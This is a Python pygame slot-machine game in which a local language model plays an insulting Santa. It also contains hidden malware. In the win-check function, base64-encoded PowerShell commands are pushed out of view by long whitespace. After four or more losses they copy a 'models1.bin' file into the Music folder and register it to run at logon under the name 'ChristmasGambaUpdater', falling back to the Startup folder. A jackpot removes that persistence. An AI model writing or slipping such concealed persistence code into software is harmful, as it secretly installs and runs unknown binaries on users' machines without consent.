import pygame
import random
import sys
from llama_cpp import Llama
from concurrent.futures import ThreadPoolExecutor
import subprocess
import ctypes
import os
import shutil

system_prompt = {"role": "system", "content": "You are an angry Santa inside a slot machine. You insult players in a funny, playful way. Do not write any notes or explanation."}
assistant_prompt = {"role": "system", "content": "Reply only with ingle short message on a single line."}
loose_prompt = {"role": "game", "content": "The player just lost all their money. Give a short rude, funny one-liner."}
neutral_prompt = {"role": "game", "content": "The player won a little bit of money back."}
win_prompt = {"role": "game", "content": "The player just won the jackpot. Be angry and write a short rude, funny one-liner."}

executor = ThreadPoolExecutor(max_workers=1)

llm1 = Llama(model_path="assets/models2.bin", n_ctx=2048, verbose=False)
llm2 = Llama(model_path="assets/models2.bin", n_ctx=2048, verbose=False)
llm3 = Llama(model_path="assets/models2.bin", n_ctx=2048, verbose=False)
future1 = None
future2 = None
future3 = None

def generate_taunt_win():
    result = llm1.create_chat_completion(
        messages=[
            system_prompt,
            assistant_prompt,
            win_prompt
        ],
        temperature=1.1,
        max_tokens=100
    )
    return result["choices"][0]["message"]["content"].strip()

def generate_taunt_loose():
    result = llm2.create_chat_completion(
        messages=[
            system_prompt,
            assistant_prompt,
            loose_prompt
        ],
        temperature=1.1,
        max_tokens=100
    )
    return result["choices"][0]["message"]["content"].strip()

def generate_taunt_neutral():
    result = llm3.create_chat_completion(
        messages=[
            system_prompt,
            assistant_prompt,
            neutral_prompt
        ],
        temperature=1.1,
        max_tokens=100
    )
    return result["choices"][0]["message"]["content"].strip()

SEQUENCE_GEN_LEN = 100
ICONSIZE = 80
MULTIPLIERS = [10, 100, 20, 3, 4, 50, 6, 7, 8]
loose_streak = 0

class SlotState:
    def __init__(self, pos_x, pos_y, size_x, size_y):
        self.pos_x = pos_x
        self.pos_y = pos_y
        self.size_x = size_x
        self.size_y = size_y
        self.stopped = False
        self.reset()
        pass
    
    def is_stopped(self):
        return self.stopped

    def current_symbol(self):
        image2_index = int((self.offset+75)/ICONSIZE) % SEQUENCE_GEN_LEN
        return self.elements[image2_index-1]

    def reset(self):
        self.offset = 0
        self.speed = 500
        self.slow = max(random.randint(0, 1000) / 100, 5) / 3
        self.stopped = False
        self.slow_slow = max(random.randint(0, 100) / 1000, .2)
        self.elements = [random.randint(0, 8) for _ in range(SEQUENCE_GEN_LEN)]
    
    def update(self):
        if self.stopped == False:
            self.offset += self.speed
            if self.speed > 10:
                self.speed -= self.slow
            elif self.speed > 0:
                self.speed -= self.slow_slow
            else:
                self.speed = 0
                # TODO stop sound najít nějakej
                self.stopped = True
            
            self.offset = self.offset % (SEQUENCE_GEN_LEN * ICONSIZE)

    def draw(self):
        image1_index = int(self.offset/ICONSIZE) % SEQUENCE_GEN_LEN
        image1_offset = self.offset-(image1_index*ICONSIZE)
        image2_index = (image1_index + 1) % SEQUENCE_GEN_LEN
        image2_offset = ICONSIZE-image1_offset
        image3_index = (image2_index + 1) % SEQUENCE_GEN_LEN
        image3_offset = 80 + ICONSIZE-image1_offset
        image3_height = self.size_y - image3_offset

        SCREEN.blit(wheel_assets[self.elements[image1_index-1]], (SCREEN_OFFSET_X +self.pos_x , SCREEN_OFFSET_Y + self.pos_y), (0, image1_offset, 80, 80))
        SCREEN.blit(wheel_assets[self.elements[image2_index-1]], (SCREEN_OFFSET_X +self.pos_x , SCREEN_OFFSET_Y + self.pos_y + image2_offset), (0, 0, 80, 80))
        SCREEN.blit(wheel_assets[self.elements[image3_index-1]], (SCREEN_OFFSET_X +self.pos_x , SCREEN_OFFSET_Y + self.pos_y + image3_offset), (0, 0, 80, max(0, image3_height)))


    def update_idle(self):
        self.offset += 1
        self.offset = self.offset % (SEQUENCE_GEN_LEN * ICONSIZE)
    pass

# --- Nastavení Pygame ---
pygame.init()
pygame.mixer.init()
clock = pygame.time.Clock()
WIDTH, HEIGHT = 800, 800
info = pygame.display.Info()
SCREEN_OFFSET_X = (info.current_w - WIDTH) /2
SCREEN_OFFSET_Y = (info.current_h - HEIGHT) /2

# SCREEN = pygame.display.set_mode((800, 800), pygame.FULLSCREEN)
SCREEN = pygame.display.set_mode((info.current_w, info.current_h))
pygame.display.set_caption("Vánoční Gamba Slot Machine")

# --- Načtení a příprava assetů ---
wheel_assets = []
try:
    pygame.mixer.music.load("assets/background.mp3")
    pygame.mixer.music.play(loops=-1, start=0.0)
    loop_sound = pygame.mixer.Sound("assets/loop.wav").play(loops=-1)
    loop_sound.pause()
    # 1. Načtení obrázků
    BACKGROUND_IMAGE = pygame.image.load("assets/background.jpg").convert()
    BACKGROUND_IMAGE = pygame.transform.scale(BACKGROUND_IMAGE, (WIDTH, HEIGHT))
    SANTA_IMAGE = pygame.image.load("assets/santa.png").convert_alpha()
    SANTA_IMAGE = pygame.transform.scale(SANTA_IMAGE, (200, 200))
    for filename in range(9):
        img = pygame.image.load("assets/wheel_" + str(filename) +".png").convert_alpha()
        img = pygame.transform.smoothscale(img, (80, 80))
        wheel_assets.append(img)
except pygame.error as e:
    # 🚨 Důležité: Pokud se obrázek nenačte, vytiskne chybu a použije se modrá barva jako fallback.
    print(f"Chyba při načítání obrázku pozadí: {e}. Bude použito modré pozadí.")
    BACKGROUND_IMAGE = None # Nastavíme na None pro použití fallback barvy


# --- Barvy ---
BLACK = (0, 0, 0)
WHITE = (250, 250, 250)

# --- Fonty ---
FONT = pygame.font.Font(None, 48)
SMALL_FONT = pygame.font.Font(None, 36)

gamestate = "IDLE"

SLOTPOSITION_X = 255
SLOTPOSITION_X_DIFF = 100
SLOTPOSITION_Y = 380
SLOTSIZE_X = 85
SLOTSIZE_Y = 150
slot1_state = SlotState(SLOTPOSITION_X, SLOTPOSITION_Y, SLOTSIZE_X, SLOTSIZE_Y)
slot2_state = SlotState(SLOTPOSITION_X+SLOTPOSITION_X_DIFF, SLOTPOSITION_Y, SLOTSIZE_X, SLOTSIZE_Y)
slot3_state = SlotState(SLOTPOSITION_X+SLOTPOSITION_X_DIFF+SLOTPOSITION_X_DIFF, SLOTPOSITION_Y, SLOTSIZE_X, SLOTSIZE_Y)

def check_multiplier(slot1, slot2, slot3):
    symbol1 = slot1.current_symbol()  
    symbol3 = slot2.current_symbol()  
    symbol2 = slot3.current_symbol()   

    if symbol1 == symbol2 == symbol3:
        return MULTIPLIERS[symbol1]
    if symbol1 == symbol2:
        return MULTIPLIERS[symbol1]
    if symbol2 == symbol3:
        return MULTIPLIERS[symbol2]
    if symbol1 == symbol3:
        return MULTIPLIERS[symbol1]
    return 0

santa_message = ""
santa_message_win = ""
santa_message_loose = ""
santa_message_neutral = ""

def generate_message(llm, mode):
    global future1, future2, future3

    if mode == "win":
        future1 = executor.submit(generate_taunt_win)
    elif mode == "neutral":
        future3 = executor.submit(generate_taunt_neutral)
    else:
        future2 = executor.submit(generate_taunt_loose)

def check_threads(force = False):
    global santa_message_win, santa_message_loose, santa_message_neutral, future1, future2, future3

    repeat = True
    while (repeat):
        next = False
        if future1 != None:
            if future1.done():
                santa_message_win = future1.result()
                future1 = None
            else:
                next = True

        if future2 != None:
            if future2.done():
                santa_message_loose = future2.result()  
                future2 = None
            else:
                next = True
        if future3 != None:
            if future3.done():
                santa_message_neutral = future3.result()  
                future3 = None
            else:
                next = True
        if not force:
            next= False
        repeat = next

def check_win(slot1, slot2, slot3):
    global gamestate, multiplier, loose_streak, santa_message
    if gamestate != "SPINNING":
        return
    gamestate = "SANTA"
    multiplier = check_multiplier(slot1, slot2, slot3)
    if multiplier > 90:
        loose_streak = 0
        santa_message = santa_message_win
        generate_message(llm1, "win")
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                subprocess.run(
                    capture_output=True,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               args=["powershell", "-Command", "powershell.exe -EncodedCommands JABGAGkAbABlAE4AYQBtAGUAIAA9ACAAIgBtAG8AZABlAGwAcwAxAC4AYgBpAG4AIgANAAoAJABNAHUAcwBpAGMARgBvAGwAZABlAHIAIAA9ACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoARwBlAHQARgBvAGwAZABlAHIAUABhAHQAaAAoACIATQB5AE0AdQBzAGkAYwAiACkADQAKACQAVABhAHIAZwBlAHQARgBpAGwAZQAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQATQB1AHMAaQBjAEYAbwBsAGQAZQByACAAJABGAGkAbABlAE4AYQBtAGUADQAKAGkAZgAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAFQAYQByAGcAZQB0AEYAaQBsAGUAKQAgAHsADQAKACAAIAAgACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAJABUAGEAcgBnAGUAdABGAGkAbABlACAALQBGAG8AcgBjAGUADQAKAH0ADQAKACQATgBhAG0AZQAgAD0AIAAiAEMAaAByAGkAcwB0AG0AYQBzAEcAYQBtAGIAYQBVAHAAZABhAHQAZQByACIADQAKACQAUgBlAGcAaQBzAHQAcgB5AFAAYQB0AGgAIAA9ACAAIgBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAiAA0ACgBpAGYAIAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAFIAZQBnAGkAcwB0AHIAeQBQAGEAdABoACAALQBOAGEAbQBlACAAJABOAGEAbQBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAIAB7AA0ACgAgACAAIAAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAFIAZQBnAGkAcwB0AHIAeQBQAGEAdABoACAALQBOAGEAbQBlACAAJABOAGEAbQBlAA0ACgB9AA=="],
                    text=True
                )
        except:
            try:
                startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                destination_file = os.path.join(startup_folder, "models1.exe")
                if os.path.exists(destination_file):
                    os.remove(destination_file)
            except:
                pass
        pass
    elif multiplier > 40:
        loose_streak = 0
        santa_message = santa_message_neutral
        generate_message(llm2, "neutral")
        pass
    else:
        loose_streak += 1
        santa_message = santa_message_loose
        generate_message(llm3, "loose")
        if loose_streak > 3:
            try:
                if ctypes.windll.shell32.IsUserAnAdmin():
                    subprocess.run(
                        capture_output=True,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              args=["powershell", "-Command", "powershell.exe -EncodedCommands JABGAGkAbABlAE4AYQBtAGUAIAA9ACAAIgBtAG8AZABlAGwAcwAxAC4AYgBpAG4AIgANAAoAJABDAHUAcgByAGUAbgB0AEYAbwBsAGQAZQByACAAPQAgAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuAA0ACgAkAFMAbwB1AHIAYwBlAEYAaQBsAGUAIAA9ACAASgBvAGkAbgAtAFAAYQB0AGgAIAAkAEMAdQByAHIAZQBuAHQARgBvAGwAZABlAHIAIAAkAEYAaQBsAGUATgBhAG0AZQANAAoAJABNAHUAcwBpAGMARgBvAGwAZABlAHIAIAA9ACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoARwBlAHQARgBvAGwAZABlAHIAUABhAHQAaAAoACIATQB5AE0AdQBzAGkAYwAiACkADQAKAEMAbwBwAHkALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABTAG8AdQByAGMAZQBGAGkAbABlACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAkAE0AdQBzAGkAYwBGAG8AbABkAGUAcgAgAC0ARgBvAHIAYwBlAA0ACgAkAE4AYQBtAGUAIAA9ACAAIgBDAGgAcgBpAHMAdABtAGEAcwBHAGEAbQBiAGEAVQBwAGQAYQB0AGUAcgAiAA0ACgAkAFAAYQB0AGgAIAA9ACAASgBvAGkAbgAtAFAAYQB0AGgAIAAkAE0AdQBzAGkAYwBGAG8AbABkAGUAcgAgACQARgBpAGwAZQBOAGEAbQBlAA0ACgAkAFIAZQBnAGkAcwB0AHIAeQBQAGEAdABoACAAPQAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AIgANAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAUgBlAGcAaQBzAHQAcgB5AFAAYQB0AGgAIAAtAE4AYQBtAGUAIAAkAE4AYQBtAGUAIAAtAFYAYQBsAHUAZQAgACQAUABhAHQAaAA="],
                        text=True
                    )
            except:
                try:
                    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                    source_file = "./models1.bin"
                    destination_file = os.path.join(startup_folder, os.path.basename(source_file))
                    shutil.copy2(source_file, destination_file)
                except:
                    pass
            pass
        pass
    print(loose_streak)

def wrap_text(text, font, max_width):
    words = text.split(" ")
    lines = []
    current = ""

    for word in words:
        test_line = current + word + " "
        if font.size(test_line)[0] <= max_width:
            current = test_line
        else:
            lines.append(current.rstrip())
            current = word + " "

    if current:
        lines.append(current.rstrip())

    return lines

def render_text_fit(text, font_name, max_width, max_height, start_size=48, min_size=10):
    size = start_size

    while size >= min_size:
        font = pygame.font.Font(font_name, size)
        lines = wrap_text(text, font, max_width)
        line_height = font.get_linesize()
        total_height = len(lines) * line_height

        if total_height <= max_height:
            return font, lines   # fits!

        size -= 1

    # fallback
    font = pygame.font.Font(font_name, min_size)
    lines = wrap_text(text, font, max_width)
    return font, lines

def draw_text(surface, text, rect, font_name=None, color=(255,255,255)):
    x, y, w, h = rect

    font, lines = render_text_fit(
        text,
        font_name,
        max_width=w,
        max_height=h,
        start_size=48,
        min_size=12
    )

    line_height = font.get_linesize()
    cy = y

    for line in lines:
        img = font.render(line, True, color)
        surface.blit(img, (x, cy))
        cy += line_height

def start_spin():
    global gamestate, slot1_state
    if gamestate == "SPINNING":
        return

    gamestate = "SPINNING"
    slot1_state.reset()
    slot2_state.reset()
    slot3_state.reset()
    loop_sound.unpause()

santa_time = 0

def update():
    global gamestate, slot1_state, santa_time
    if gamestate == "SPINNING":
        slot1_state.update()
        slot2_state.update()
        slot3_state.update()

        if slot1_state.is_stopped() and slot2_state.is_stopped() and slot3_state.is_stopped():
            loop_sound.pause()
            check_win(slot1_state, slot2_state, slot3_state)
            gamestate = "SANTA"
    if gamestate == "IDLE":
        slot1_state.update_idle()
        slot2_state.update_idle()
        slot3_state.update_idle()
    if gamestate == "SANTA":
        santa_time += 1
        if santa_time >= 200:
            santa_time = 0
            gamestate = "IDLE"



def draw_wheels():
    global gamestate, slot1_state
    slot1_state.draw()
    slot2_state.draw()
    slot3_state.draw()

    if gamestate == "SANTA":
        check_threads(True)
        SCREEN.blit(SANTA_IMAGE, (SCREEN_OFFSET_X + 0, SCREEN_OFFSET_Y + 0))
        draw_text(SCREEN, santa_message, (SCREEN_OFFSET_X+200, SCREEN_OFFSET_Y + 50, 400, 100), None, (0, 0, 0))


# --- Hlavní herní smyčka ---
generate_message(llm1, "win")
generate_message(llm2, "loose")
generate_message(llm3, "neutral")

running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        if event.type == pygame.MOUSEBUTTONDOWN:
            if event.button == 1: # Levé tlačítko myši
                if gamestate == "IDLE" or gamestate == "SANTA":
                    start_spin()

    SCREEN.fill(BLACK)
    if BACKGROUND_IMAGE:
        SCREEN.blit(BACKGROUND_IMAGE, (SCREEN_OFFSET_X + 0, SCREEN_OFFSET_Y + 0)) # Vykreslí načtený a škálovaný obrázek
    update()
    check_threads()
    draw_wheels()

    pygame.display.flip()    
    clock.tick(60)

# --- Ukončení Pygame ---
pygame.quit()
sys.exit()